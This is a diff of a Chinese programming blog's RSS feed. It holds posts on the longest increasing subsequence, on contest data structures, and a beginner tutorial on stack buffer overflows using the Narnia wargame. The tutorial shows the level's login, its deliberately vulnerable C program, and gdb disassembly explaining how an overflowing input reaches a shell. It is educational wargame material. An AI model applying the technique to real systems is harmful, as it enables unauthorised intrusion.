@@ -1,90 +1,795 @@
-<!DOCTYPE html>
-<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
-  <head>
-    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
-    <meta name="author" content="Ello" />
-    <title> | Ello</title>
-    <link rel="shortcut icon" href="/favicon.ico">
-    <link href="/feed/" rel="alternate" title="Ello" type="application/atom+xml" />
-    <link rel="stylesheet" href="/media/css/style.css">
-    <link rel="stylesheet" href="/media/css/highlight.css">
-    <script type="text/javascript" src="/media/js/jquery-1.7.1.min.js"></script>
-  </head>
-  <body>
-    <div id="container">
-      <div id="main" role="main">
-        <header>
-        <h1></h1>
-        </header>
-        <nav>
-        <span><a title="home page" class="" href="/">Home</a></span>
-        <span><a title="about" class="" href="/about/">About</a></span>
-        <span><a title="guestbook" class="" href="/guestbook/">Guestbook</a></span>
-        <span><a title="categories" class="" href="/categories/">Categories</a></span>
-        <span><a title="tags" class="" href="/tags/">Tags</a></span>
-        <span><a title="links" class="" href="/links/">Links</a></span>
-        <span><a title="subscribe by RSS" class="" href="/feed/">Subscribe</a></span>
-        </nav>
-        <article class="content">
-        <section class="post">
 <?xml version="1.0" encoding="utf-8"?>
   <rss version="2.0"
         xmlns:content="http://purl.org/rss/1.0/modules/content/"
         xmlns:atom="http://www.w3.org/2005/Atom"
   >
   <channel>
-    <title>Ello</title>
-    <link href="http://localhost:4000/feed/" rel="self" />
-    <link href="http://ellochen.github.io" />
-    <lastBuildDate>2013-03-04T00:15:30+08:00</lastBuildDate>
+    <title>MikeWang</title>
+    <link href="http://mikewang.github.com/feed/" rel="self" />
+    <link href="http://ellochen.github.com" />
+    <lastBuildDate>2014-03-30T21:10:37+08:00</lastBuildDate>
     <webMaster>silver.accc@gmail.com</webMaster>
     
     <item>
-      <title>Hello world!</title>
-      <link href="http://localhost:4000/2013/03/hello-world/"/>
-      <pubDate>2013-03-03T00:00:00+08:00</pubDate>
-      <author>Ello</author>
-      <guid>http://localhost:4000/2013/03/hello-world</guid>
-      <content:encoded><![CDATA[<h1>first</h1>
+      <title>最长递增子序列简单总结</title>
+      <link href="http://mikewang.github.com/2014/02/%E6%9C%80%E9%95%BF%E9%80%92%E5%A2%9E%E5%AD%90%E5%BA%8F%E5%88%97%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93/"/>
+      <pubDate>2014-02-17T00:00:00+08:00</pubDate>
+      <author>MikeWang</author>
+      <guid>http://mikewang.github.com/2014/02/最长递增子序列简单总结</guid>
+      <content:encoded><![CDATA[<h3>问题:</h3>
 
-<h2>second</h2>
+<p>有一个长为n的数列a[0], a[1], ..., a[n-1]. 请求出这个序列中最长的上升子序列的长度. 上升子序列指的是对于任意的i &lt; j都满足a[i] &lt; a[j]的子序列.<br/>
+限制条件:</p>
 
 <ul>
-<li>test1</li>
-<li>test2</li>
-<li>test3
-
-<blockquote><p>test4</p></blockquote></li>
+<li>1 &lt;= n &lt;= 1000</li>
+<li>0 &lt;= a[i] &lt;= 1000000</li>
 </ul>
 
+
+<h3>动态规划解法</h3>
+
+<p>动态规划解决问题的步骤一般如下:</p>
+
+<ul>
+<li>确定是否满足无后效性和最优子结构性质以及是否存在较多子问题重叠, 这些是问题是否可以使用动态规划的先决条件.</li>
+<li>状态的表示: 注意设计的状态要满足无后效性, 可以通过增加维数的方式消除无后效性, 另一个原则是在保证无后效性的前提下尽量得到更多的在重叠子问题.</li>
+<li>设计状态迁移方程: 状态迁移来源于最优子结构性质, 状态迁移方程实际上就是通过子问题求解父问题的等式关系.</li>
+<li>两种实现: 记忆化搜索, 递推. 前者的好处是书写简单, 后者的好处是可以使用滚动数组等手段进行优化.</li>
+</ul>
+
+
+<p>看一下如何应用到LIS问题上.</p>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>算法竞赛实用数据结构</title>
+      <link href="http://mikewang.github.com/2014/01/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B%E5%AE%9E%E7%94%A8%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
+      <pubDate>2014-01-31T00:00:00+08:00</pubDate>
+      <author>MikeWang</author>
+      <guid>http://mikewang.github.com/2014/01/算法竞赛实用数据结构</guid>
+      <content:encoded><![CDATA[<p>想起那天听到线段树、树状数组、AC自动机...时，夕阳下脸上被映红的苦笑，那是我逝去的青春......</p>
+
+<h3>并查集</h3>
+
+<p>并查集这个名字看起来很拽的样子，其实它很简单，顾名思义，它实现的是集合中的合并和查找功能。</p>
+
+<ul>
+<li>合并元素a和元素b各自所在的集合。</li>
+<li>查询元素a和元素b是否属于同一组。</li>
+</ul>
+
+
+<p>并查集是用树来实现的，每个集合都会用其中一个元素作为根结点来代表这个集合，我们称之为组长，两个集合合并的时候会将树深度小的集合的根结点向树深度大的集合的根结点连边，成为深度大的树的根结点的儿子，就好像大组在吞并小组。那么查询两个元素是否是同一个组，只要分别从这两个元素的父亲开始向上遍历直到到达根结点为止，得到两个元素所在集合的根节点编号，如果相同则是同一个集合，如果不同则是不同集合，就好像问各自组的组长是谁。如图所示:</p>
+
+<p><img src="https://raw2.github.com/ellochen/Img-store/master/bc1.png" alt="图0" /></p>
+
+<p>这些还不是并查集的全部，想象一下两个组合并以后，小组的组长归并到大组后肯定也是个小头目，这样多次的进行吞并后，大组变得越来越壮大于此同时层级也越来越多，组长下面有多个小组长小组长下面又有多个小队长，放在代码实现里看就是一个树的深度越来越大形成了一个很多层的树，在最坏的情况下n个成员可能形成一个n层的树，就从树退化成了一个链表，这是当你询问最底层的小弟你们组老大是谁的时候，他可是懵懂无知的小痞子啊，根本没法接触到上层，所以他只能问自己的老大，老大再问老大的老大，这样层层向上遍历，等到遍历到组长是谁的时候，已经花费很长时间了，所以你决定学习中国古代秦始皇的中央集权制，取消了分层管理的制度，把每个组的所有成员都交给组长一手管理，在代码实现里来看就是把树的所有结点都作为根节点的儿子，这样的话以后问小弟你们组长是谁的时候小弟一下子就答出来了，真是高效的黑帮管理制度，然而选择在何时进行权力的收拢呢，在吞并小组的时候不太合适，刚刚吞并，军心不稳，此时收拢权力也是费力不讨好的，你想出了一个好办法就是每次在查询某个小弟的大哥是谁的时候，以自己不耐烦等待为理由要求组长把该小弟向上询问的所有小队长小组长包括他自己都归到组长手下来管，这样下次再问时就快捷的多了。在代码实现中也是这样，每次查询的时候会把元素向上遍历时经过的所有结点包括自己都直接连到根上，下次再查询这些结点就很快了。这个过程学名叫<strong>路径压缩</strong>。</p>
+
+<p><img src="https://raw2.github.com/ellochen/Img-store/master/bc2.png" alt="图1" /></p>
+
+<p>并查集我准备就讲到这里，本文只是描述一个直觉上的印象，希望大家结合代码再深一步的去理解，这里给出一些练习题目：</p>
+
+<ul>
+<li><a href="http://poj.org/problem?id=1182">食物链</a></li>
+<li><a href="http://uva.onlinejudge.org/index.php?option=com_onlinejudge&amp;Itemid=8&amp;page=show_problem&amp;problem=3601">X-Plosives</a></li>
+<li><a href="http://uva.onlinejudge.org/index.php?option=com_onlinejudge&amp;Itemid=8&amp;category=446&amp;page=show_problem&amp;problem=4075">Corporative Network</a></li>
+</ul>
+
+
+<h3>优先队列</h3>
+
+<p>优先队列的概念很好理解，简单来说，它是保证每次出队的元素是队列中最大（小）元素的队列，在STL里面有现成的实现 <code>priority_queue</code> ，STL的使用我就不必讲了，本文主要侧重于各种使用数据结构的概念及原理。</p>
+
+<p>如果让你来实现这样一个功能，你要怎样实现，有一个想法是先把队列元素排个序就可以了，然而还要考虑作为一个队列是需要很多次入队操作的，如果基于有序数组的实现，每次入队都要重新排列整个队列，复杂度是O（n）。</p>
+
+<p>有没有更快的方式呢，如果你数据结构没忘光是不是会想起<strong>二叉查找树</strong>呢（后面我会专门讲到），名字好难听，都是二叉一族的...,二叉查找树也叫有序查找树，它可以在插入的时候保证数据的有序性，且插入的期望时间复杂度是O（log n），二叉查找树除叶子结点外的每一个结点的值，都大于它的左子结点，小于它的右子结点，所以最左面的叶子结点就是整棵树的最小结点，在优先队列的应用中每次只要找到这个结点并删除它就可以完成出队操作，期望时间复杂度也是O（log n）。</p>
+
+<p>二叉查找树其实并不是最好的选择，因为它有可能退化成线性链表，此时的插入删除复杂度为O（n），如果使用平衡树，比如AVL树或是红黑树倒是可以解决这个问题，但是实现起来又过于复杂，有木有一个高效简洁的实现方案呢？</p>
+
+<p><strong>二叉堆（binary heap）</strong>，它是解决这个问题的巧妙方案，二叉堆也是树，是一种<strong>完全二叉树</strong>，也就是说除最后一层外，其他层都是满的，并且最后一层或者是满的，或者是在右边缺少连续若干节点。我们看一下二叉堆的概念和实现。</p>
+
+<p>二叉堆的主要属性是，父亲的值永远大（小）于儿子，具体是大还是小，要看你应用场景是需要最大堆还是最小堆了。就如同二叉查找树一样，保证这个属性的关键在于插入和删除时候对结点的处理，我找几个图来讲这两个过程：</p>
+
+<p><img src="https://raw2.github.com/ellochen/Img-store/master/heap1_.png" alt="图2" /></p>
+
+<p>以上两图是在最小堆中插入14的过程，由于是完全二叉树，所以插入一个元素后，堆的最下层最右侧一定会多出一个空位，先尝试把14填到该空位中，发现14比父节点31要小，不符合最小堆的特性，于是我们将31移到下面空位，空出自己的位置作为新空位，依次类推，14尝试填到新的空位依旧比它的父节点21要小，于是再次把21移到下面空位，留出新的空位，此时14放到空位处恰好满足最小堆的特性，插入任务达成。说白了就是小人物不断攀爬把前辈一个个踩到脚底下从而走上人生巅峰的过程，说好听点叫做：<strong>percolate up</strong>。</p>
+
+<p><img src="https://raw2.github.com/ellochen/Img-store/master/heap2_.png" alt="图3" /></p>
+
+<p>以上两图是在最小堆中删除根节点也就是最小项13的过程，由于是完全二叉树，删除一个元素后，堆最下层最右侧的元素31必定要拿开放到其他位置，堆中删除元素的过程实际上就是给31这哥们找个地方安置的过程，首先要把根节点的13给踢开留下一个空位，我们试着把31放进去发现31比13的左膀右臂14和16都要大，所以不可行，那么选择数值较小的14移到上面的空位去，留下自己的位置作为新的空位，依次类推，把31放进新空位依旧不可行，于是把14的子节点中数值较小的21移上去，留下新空位，此时31放到这里恰到好处，于是删除根节点任务达成。这个过程叫做：<strong>percolate down</strong>。</p>
+
+<p>二叉堆的特性讲完了，看来已经完美支持优先队列的功能了，入队操作就是二叉堆的插入，出队操作就是二叉堆的删除根节点。看起来似乎并不复杂，那么如何实现呢？之前我多次强调二叉堆是完全二叉树，根据完全二叉树的特性，它可以用数组来实现，给每个结点顺次编号，每一个结点左儿子的编号等于自己编号*2N，右儿子的编号等于自己编号*2N+1。如图所示：</p>
+
+<p><img src="https://raw2.github.com/ellochen/Img-store/master/heap3_.png" alt="图4" /></p>
+
+<p>上图数组中的元素对应着堆中的结点。<br/>
+这里留几道与优先队列相关的题目：</p>
+
+<ul>
+<li><a href="http://poj.org/problem?id=2431">Expedition</a></li>
+<li><a href="http://poj.org/problem?id=3253">Fence Repair</a></li>
+<li><a href="http://uva.onlinejudge.org/index.php?option=com_onlinejudge&amp;Itemid=8&amp;category=247&amp;page=show_problem&amp;problem=3644">Argus</a></li>
+<li><a href="http://uva.onlinejudge.org/index.php?option=com_onlinejudge&amp;Itemid=8&amp;category=229&amp;page=show_problem&amp;problem=3148">K Smallest Sums</a></li>
+</ul>
+
+
+<h3>Sparse Table</h3>
+
+<p>我们先来提出一个问题,范围最小值问题(Range Minimum Query)简称RMQ : <em>给出n个元素的数组 A1,A2,A3,...,An, 设计一个数据结构, 支持查询操作Query(L,R): 计算子序列A[L],A[L+1],...,A[R]的最小值.</em></p>
+
+<p>这看起来是个非常简单的问题, 最朴素的方法就是遍历子序列找到最小值就, 但是想象下数据量非常大比如上亿的情况, O(n)的查询时间是不可忍的, Sparse Table就是解决该问题的有力武器, 它有O(nLogn)的预处理时间,而查询的复杂度仅为O(1).</p>
+
+<p>看一下具体的做法, 首先预处理要达到的效果是, 得到原数组从一个位置开始长度为1,2,4,8,...的区间内的最小值并存到一个表中, 这个过程中, 长度为2<sup>i</sup>的区间最小值只需要通过比较2个长度为2<sup>i-1</sup>的区间最小值即可得到, 也就是说后面的计算直接用到前面已经存在表格里面的计算结果, 这是简单的动态规划, 我画了一张图示来表现这个过程:</p>
+
+<p><img src="https://raw2.github.com/ellochen/Img-store/master/st1.png" alt="图5" /></p>
+
+<p>简单说下图的意思, 先对原数组每一个位置取长度为1的区间,每个区间取最小值存起来也就是range=1那一行, 然后对原数组每个位置取长度为2的区间, 每个区间取最小值存起来也就是range=2那一行,然后对原数组每个位置取长度为4的区间, 每个区间取最小值存起来, 也就是range=4那一行,这时你会发现我只要利用range=2那一行中的值就可以得到range=4那一行, 不需要对原数组进行重新计算,就这样依次类推得到一个二维数组, 也就是我们预处理的结果, 在实际编码中一般还是存储最小值的下标, 这里简单起见直接存最小值了.</p>
+
+<p>好啦有了这个数组我们就可以进行O(1)的查询了, 怎么做呢,  比如要查询[L, R]区间的最小值, 我们现在已经有了所有2<sup>i</sup>长度区间的最小值, 那么我们就从表格中找到从L开始不超出[L, R]的最长的一个2<sup>i</sup>区间, 得到它的最小值a, 然后在从R开始向前找到一个同样长度的区间得到最小值b, 于是[L, R]区间的最小值就是min(a, b). 如图所示:</p>
+
+<p><img src="https://raw2.github.com/ellochen/Img-store/master/st2_.png" alt="图6" /></p>
+
+<p>这两幅图, 前者是求[1, 7]区间的最小值, 结果为7, 后者是求整个数组也就是[0, 9]的最小值, 结果为1.</p>
+
+<p>留一道相关题目:<br/>
+<a href="http://uva.onlinejudge.org/index.php?option=onlinejudge&amp;page=show_problem&amp;problem=2176">Frequent values</a></p>
+
+<h3>平方分割</h3>
+
+<h3>线段树</h3>
+
+<h3>树状数组</h3>
+
+<h3>线段树深入</h3>
+
+<h3>二叉查找树</h3>
+
+<ol>
+<li>Treap</li>
+<li>伸展树</li>
+</ol>
+
+
+<h3>Trie</h3>
+
+<h3>KMP 算法</h3>
+
+<h3>Aho-Corasick 自动机</h3>
+
+<h3>后缀数组</h3>
+
+<h3>最长公共前缀(LCP)</h3>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>Linux栈缓冲区溢出浅析</title>
+      <link href="http://mikewang.github.com/2014/01/Linux%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%B5%85%E6%9E%90/"/>
+      <pubDate>2014-01-19T00:00:00+08:00</pubDate>
+      <author>MikeWang</author>
+      <guid>http://mikewang.github.com/2014/01/Linux栈缓冲区溢出浅析</guid>
+      <content:encoded><![CDATA[<p>这几天脑子抽风突然去玩Mac下的软件破解, 在和煎饼果子同学回顾汇编知识的时候提到了栈缓冲区溢出技术, 我发现虽然自己了解它的基本原理但是倘若实践起来很多细节都还是模棱两可, 于是突然兴趣大发搞鼓了起来, 本文算是对这两天学到的做一个简单的总结, 也算是一个纯粹面向Beginner的栈缓冲区溢出初级教程. 我记得<a href="http://book.douban.com/subject/2702069/">The shellcoder's Handbook</a>里面提到过, 栈缓冲区溢出是目前人类最了解最公开的漏洞之一, 为了不让人们发现我不是人类, 我才提笔写下此文, 内容之浅, 表达之误, 欢迎批评指正.</p>
+
+<p>我会阐述原理,同时尽力从实践的角度来一步步地进行说明, 由于水平有限, 不会对现有软件进行实验, 不同平台的栈缓冲区溢出技术都有差异我无力一一讲解, 并且由于不可执行栈等技术的出现导致传统的栈缓冲区溢出基本丧失攻击力, 尽管如此各种攻击手段最基本的原理和思想都很类似, 栈缓冲区溢出无疑是其中最基础的一环必须要掌握, 在这里我选择了以编程游戏闯关的方式来进行讲解, 游戏来自<a href="http://www.overthewire.org/wargames/narnia/">Narnia</a>的前5道题目, narnia是一个饶有趣味的hack游戏, 本文会对该网站的使用方法进行讲解.</p>
+
+<h3>准备知识</h3>
+
+<p>先说说缓冲区溢出到底是要干嘛.简单说来就是上可破解应用软件, 下可征服操作系统, 文能做外挂, 武能搞越狱. 可谓黑道骚年不可或缺的技能之一, 好了, 我想我说完了, 下面是学前需要了解的技能和知识, 其实不了解也罢, 我会慢慢教给你~</p>
+
+<ol>
+<li><p>汇编语言<br/>
+对于很多人来说, 汇编如同魔法咒文, 没错我也这么想, 不过如果你把汇编语法忘光了我劝你赶快找本书补充一下汇编知识, 要想学习栈缓冲区溢出其实了解几个常用的指令就可以了, 现学现用, 就当时背咒语了, 要知道这咒语念出的魔法可是非常强大的. 要说非要推荐个资料之类的, 反正在学习之前我看了这个链接快速地回顾了一下汇编语言的两种主流语法<strong>AT&amp;T汇编格式</strong>和<strong>Intel汇编格式</strong>: <a href="http://www.ibm.com/developerworks/cn/linux/l-assembly/">Linux 汇编语言开发指南</a></p></li>
+<li><p>内存管理<br/>
+传统的缓冲区溢出简单来说分两种其一是本文着重介绍的栈缓冲区溢出, 其二是堆缓冲区溢出(其他的包括格式化字符串漏洞,整型溢出等原理都有类似), 栈和堆无疑是内存管理中重要的两个概念, 掌握内存管理的同时也要了解, 二进制可执行文件是如何加载到内存中的, 加载到内存中后代码和数据在内存中的哪个位置, 以及代码是如何在内存中被执行的, 等等这些概念都是非常重要的. 骚年们可以参考这本书: <a href="http://book.douban.com/subject/3652388/">程序员的自我修养</a>, 当然了如果你说你看<a href="http://book.douban.com/subject/5333562/">CSAP</a>, 那就更好了, 估计没我什么事了.</p></li>
+<li><p>gdb<br/>
+linux下无论是搞软件破解还是搞缓冲区溢出无处不见此神器的身影, 骚年们先去熟悉下gdb的命令吧, 如果你是Mac OX系统就去了解下lldb的语法, 基本类似但也有不少差别. 我当时查阅的是这个链接给出了gdb和lldb常用的区别: <a href="http://lldb.llvm.org/lldb-gdb.html">GDB to LLDB Command Map</a></p></li>
+<li><p>shell &amp; python<br/>
+这和缓冲区溢出显然没什么直接关系, 但是本文主要阐述Linux下的栈缓冲区溢出, shell的使用是必要的, 至于python是为了方便格式化我们想要的二进制串来对你要hack的程序进行输入, 你比如说我要构造包含100个0x90的串, 在python中只要<code>print "\x90"*100</code>就好了, 真是简洁有效. 当然你用其他任何方法来实现同样的效果都没问题. 不管你怎么做, 反正我是这么做的 ^_^.</p></li>
+</ol>
+
+
+<p>准备就到这里, 让我们开始栈缓冲区溢出的Happy游戏之旅吧~</p>
+
+<h3>登录Narnia</h3>
+
+<p>登录游戏之前呢我们先来简单了解一下<a href="http://www.overthewire.org/wargames/narnia/">Narnia</a>, 你们知道纳尼亚(Narnia)传奇么, 讲述了几个少年到衣橱背后世界冒险的故事, 而此时我们也将经历另一场扣人心弦的冒险, 这个游戏从level0至level9共10个关卡, 而我们的冒险就从level0开始到level4结束, 这5个关卡相对比较容易, 并且都是栈缓冲区溢出相关的, 关卡的名称分别是narnia0, narnia1, narnia2, narnia3, narnia4.</p>
+
+<p>游戏中每一个关卡都需要通过ssh登录到<a href="narnia.labs.overthewire.org">narnia.labs.overthewire.org</a>服务器上面.每一个关卡都拥有自己的用户名和密码, 用户名与关卡名称相同, 即narnia0-narnia4, 而密码则另有门道, 开始我们只知道narnia0关卡的密码, 这个密码很简单就是"narnia0", 而其他关卡则需要成功闯过前一关才能得到后一关的密码, 这就好像在玩密室逃脱游戏, 你获得一个谜题只有解开它才能找到下一个谜题, 就这样串联式地探索下去, 直到密室打开.</p>
+
+<p>比如我要登录narnia0关卡, 在linux命令行下输入下面的命令, 以用户名narnia0来登录narnia服务器:</p>
+
+<pre><code>ssh -l narnia0 narnia.labs.overthewire.org
+</code></pre>
+
+<p>密码输入"narnia0"即可.<br/>
+下面我们就来攻克narnia0关卡! 这是学习栈缓冲区溢出的第一步~.</p>
+
+<h3>第0关:覆盖栈内存</h3>
+
+<p>我们已经用narnia0的身份登录到服务器上, 敲入 <code>cd /narnia/</code> , 来到该目录下将看到如下的文件:<br/>
+<img src="https://raw2.github.com/ellochen/Img-store/master/narnia0.png" alt="image" /><br/>
+分别是narnia0到narnia9这10个关卡对应的源代码和其编译生成的可执行文件.刚刚是用narnia0用户身份登录的, 所以我们只能访问或执行narnia0相关的文件, 而其他文件没有访问权限, 其他关卡同理.<br/>
+现在打开narnia0.c看下源码:</p>
+
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main(){
+    long val=0x41414141;
+    char buf[20];
+
+    printf("Correct val's value from 0x41414141 -&gt; 0xdeadbeef!\n");
+    printf("Here is your chance: ");
+    scanf("%24s",&amp;buf);
+
+    printf("buf: %s\n",buf);
+    printf("val: 0x%08x\n",val);
+
+    if(val==0xdeadbeef)
+        system("/bin/sh");
+    else {
+        printf("WAY OFF!!!!\n");
+        exit(1);
+    }
+
+    return 0;
+}
+</code></pre>
+
+<p>缕一下代码的逻辑发现了不可思议的地方, 在程序刚开始定义了这个语句 <code>long val=0x41414141;</code> ,然而在下面的代码中出现了这样的语句 <code>if(val==0xdeadbeef)</code>, 而在此期间并没有对val变量赋值的语句, 唯一的赋值语句是 <code>scanf("%24s",&amp;buf);</code>, 这还是对buf数组的输入, 这可是完全风马牛不相及的两个变量啊, 貌似不可能执行到这个分支里嘛! 好的, 你能想到这一点说明你对C语言表面的语法理解的很正确, 然而C语言只是贴近程序员的一层抽象, 如果从汇编和内存的角度来看待这段代码呢? 会是另一番风景.</p>
+
+<p>我要先告诉你, 这段代码完全可以运行到 <code>system("/bin/sh");</code> 这个分支上面去, 只需要在向buf数组输入值的时候多输入一些特定字符即可, 聪明的你是不是想到了什么? 好的不管这是多么简单的一件事, 我觉得还是有必要从原理上解释一下, 来验证你的猜想.</p>
+
+<p>解释之前你需要先知道几个基本知识:<br/>
+一个二进制可执行文件主要分为.text段, .data段, .bss段等等, .text段对应着代码, .data段对应着数据, 当系统将可执行文件加载到内存中后,会创建一个虚拟的进程空间, 这个进程空间有4G大小, 系统会把代表着可执行代码的.text段放置在较低的地址处, 再往上是.data段, .bss段等, 再往上是两个重要的数据空间, 堆和栈, 堆从低地址到高地址扩展, 栈从高地址到低地址扩展, 这样从图形上看待这个进程空间的内存布局就是这样子的:<br/>
+<img src="https://raw2.github.com/ellochen/Img-store/master/stack.png" alt="image" /><br/>
+程序开始执行的时候,  有一个叫做EIP的小伙子, 啊不, 是寄存器, EIP存储着下一个要执行的指令的地址, 也就是上图中Text区域中的某个位置, 系统会忠实地依次执行EIP指向的指令, 在执行过程中如果遇到函数调用, 在汇编这个层级, 一般是遇到call指令的时候, 栈的show time就开始了, 也就是上图中Stack的那个区域. 我们都知道实现递归的传统方式就是依靠栈, 有了栈的存在, 函数的层层调用就容易的多, 调用函数的时候, 会先把传给该函数的参数压入栈中, 再将函数返回后下一个指令的地址压入栈中我们简称保存该指令的区域为RET, 然后抽象的角度来看会为该函数创建一个栈帧, 会向栈帧中压入函数调用者栈帧的地址, 然后为该函数中定义的各个变量依次预留空间, 无论该函数多么复杂, 定义了多少变量, 当它执行完后首先会将该函数栈帧弹栈然后通过ret指令来将控制权交给函数调用者, 并执行之前保存的RET指向的指令, 函数调用的控制权转换就这样轻易的实现, 这都是栈的功劳, 我们再次以图形的角度看看函数调用时栈里的内存布局:<br/>
+<img src="https://raw2.github.com/ellochen/Img-store/master/stack2.gif" alt="image" /><br/>
+文字加图形解释完后让你大致有个不那么精确的印象就好, 下面我们直接来看函数调用的汇编代码, 我们敲入 <code>gdb narnia0</code>, 启动gdb调试narnia0可执行文件, 敲入 <code>set disassembly-flavor intel</code> 将汇编显示格式设定为Intel格式(我假定你更熟悉Intel格式的语法), 然后敲入 <code>disassemble main</code> 来对main函数进行反汇编, 得到下面的代码, 结合上面的C源码来看哈~:</p>
+
+<pre><code>   0x080484c4 &lt;+0&gt;:     push   ebp                              ;将上一个栈帧地址push到栈里
+   0x080484c5 &lt;+1&gt;:     mov    ebp,esp                          ;esp代表栈顶地址, 将栈顶地址赋值给ebp, ebp此时存放着当前栈帧地址
+   0x080484c7 &lt;+3&gt;:     and    esp,0xfffffff0
+   0x080484ca &lt;+6&gt;:     sub    esp,0x30                         ;为val和buf两个变量预留0x30也就是48个字节的空间
+   0x080484cd &lt;+9&gt;:     mov    DWORD PTR [esp+0x2c],0x41414141  ;为val变量初始化为0x41414141
+   0x080484d5 &lt;+17&gt;:    mov    DWORD PTR [esp],0x8048640
+   0x080484dc &lt;+24&gt;:    call   0x80483b0 &lt;puts@plt&gt;
+   0x080484e1 &lt;+29&gt;:    mov    eax,0x8048673
+   0x080484e6 &lt;+34&gt;:    mov    DWORD PTR [esp],eax
+   0x080484e9 &lt;+37&gt;:    call   0x80483a0 &lt;printf@plt&gt;
+   0x080484ee &lt;+42&gt;:    mov    eax,0x8048689
+   0x080484f3 &lt;+47&gt;:    lea    edx,[esp+0x18]
+   0x080484f7 &lt;+51&gt;:    mov    DWORD PTR [esp+0x4],edx          ;将scanf函数需要的参数push到栈里, 只不过是用mov来实现push的效果
+   0x080484fb &lt;+55&gt;:    mov    DWORD PTR [esp],eax              ;同上
+   0x080484fe &lt;+58&gt;:    call   0x8048400 &lt;__isoc99_scanf@plt&gt;   ;调用scanf("%24s",&amp;buf);
+   0x08048503 &lt;+63&gt;:    mov    eax,0x804868e
+   0x08048508 &lt;+68&gt;:    lea    edx,[esp+0x18]
+   0x0804850c &lt;+72&gt;:    mov    DWORD PTR [esp+0x4],edx
+   0x08048510 &lt;+76&gt;:    mov    DWORD PTR [esp],eax
+   0x08048513 &lt;+79&gt;:    call   0x80483a0 &lt;printf@plt&gt;
+   0x08048518 &lt;+84&gt;:    mov    eax,0x8048697
+   0x0804851d &lt;+89&gt;:    mov    edx,DWORD PTR [esp+0x2c]
+   0x08048521 &lt;+93&gt;:    mov    DWORD PTR [esp+0x4],edx
+   0x08048525 &lt;+97&gt;:    mov    DWORD PTR [esp],eax
+   0x08048528 &lt;+100&gt;:   call   0x80483a0 &lt;printf@plt&gt;
+   0x0804852d &lt;+105&gt;:   cmp    DWORD PTR [esp+0x2c],0xdeadbeef
+   0x08048535 &lt;+113&gt;:   jne    0x804854a &lt;main+134&gt;
+   0x08048537 &lt;+115&gt;:   mov    DWORD PTR [esp],0x80486a4
+   0x0804853e &lt;+122&gt;:   call   0x80483c0 &lt;system@plt&gt;
+   0x08048543 &lt;+127&gt;:   mov    eax,0x0
+   0x08048548 &lt;+132&gt;:   leave                                   ;执行mov esp,ebp和pop ebp来清空栈帧并恢复ebp,此时esp指向RET
+   0x08048549 &lt;+133&gt;:   ret                                     ;pop eip将之前存放在RET区域的指令地址恢复到eip中,并继续执行指令  
+</code></pre>
+
+<p>我已经将自己觉得重要的指令加上了注释, 现在结合一下上图函数调用时栈里的内存布局和汇编代码, 我们有这样一个信息要强调, 函数中连续定义的变量是在栈内存中是紧挨着的, 以这段汇编代码为例, 第五行可以看出, 变量val的地址是esp+0x2c, 也就是栈顶向上数44个字节, 那么buf变量的地址就一定处在esp+0x2c往下数20字节的位置, 也就是esp+0x2c-0x14的位置上, 我们现在可以用gdb调试一下验证这个猜测.</p>
+
+<p>我们先在输入完buf之后打上断点, 比如 <code>br *0x08048508</code> 就是在0x08048508这个地址对应的指令上打上断点, 然后我们敲入 <code>run</code> 来运行程序, 程序会提示你对buf输入, 我们输入一个易于识别的标记, 比如说输入20个字符1, 在内存中就是20个0x31, 输入完成后程序会停在我们之前打的断点上, 这个时候我们敲入 <code>x /64x $esp</code> 来显示栈顶开始往上的64个字的内存情况, 得到的结果如下图所示:<br/>
+<img src="https://raw2.github.com/ellochen/Img-store/master/esp.png" alt="image" /><br/>
+好现在从上图里我们应该可以清楚的找到连续20个0x31的位置, 我们根据在显示中的位置简单算下, 发现它的起始地址是0xffffd718, 这个地址也就是buf变量的地址, 我们验证一下这个地址是否是刚辞说的esp+0x2c-0x14呢, 首先 <code>print $esp</code> 查看esp也就是栈顶的地址, 是0xffffd700, 计算一下0xffffd700+0x2c-0x14发现恰好和刚才算的一样, 那么这20个0x31上面就一定是0x41414141了, 我们在上图中找一下, 咦? 在val变量的地址处值是0x41414100, 后两位本来应该是41为什么变成00了呢? 原来我们对字符数组scanf之后, 系统会自动给它添加一个'\0'来表示字符串结束, 这里正确的习惯应该是输入19个字符才对, 我的一个小失误导致了buf数组多出来的'\0'字符覆盖到了val变量的值上, 好吧, 看到这里我想你已经懂了, 我就不告诉你我是故意这样失误的~. 我再废口舌解释一下吧, 由于栈的是从高地址向低地址扩展的, 所以在栈内存布局中先定义的变量会在后定义的变量地址之上, 当后定义的buf数组溢出之后就会覆盖到先定义的val变量中, 我们只要精心构造溢出的数据, 就可以向narnia0.c代码里暗示的那样把val变量从0x41414141变成0xdeadbeef. 貌似我把一个非常简单的道理给讲的复杂了, 但是在这个复杂的表述中我教了你函数调用在栈中的内存布局, 教你了如何用gdb反汇编代码如何用gdb查看寄存器值以及查看内存的值, 这个过程对新手是有必要的, 这也是为下几关做好铺垫, 所以我不厌其烦的把这个我已经很熟悉的道理如此费力的表述给你, 希望你已经理解了~.</p>
+
+<p>好的, 道理上我们都解释通了, 接下来就是实际操作, 把narnia0关卡hack掉! 我们快点执行这个过程, 我直接给出图示:<br/>
+<img src="https://raw2.github.com/ellochen/Img-store/master/0re.png" alt="image" /><br/>
